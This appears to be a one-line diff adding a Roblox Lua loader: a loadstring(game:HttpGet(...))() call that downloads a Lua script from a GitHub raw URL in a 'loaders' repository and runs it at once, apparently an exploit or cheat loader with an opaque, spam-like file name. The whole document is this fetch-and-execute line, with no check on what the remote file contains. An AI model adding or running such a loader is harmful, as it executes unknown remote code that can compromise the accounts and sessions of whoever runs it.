@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Unitetrumake/loaders/main/loaders/hide-in-pixels-spam7-uxm0zte7f7jkgn.lua"))()
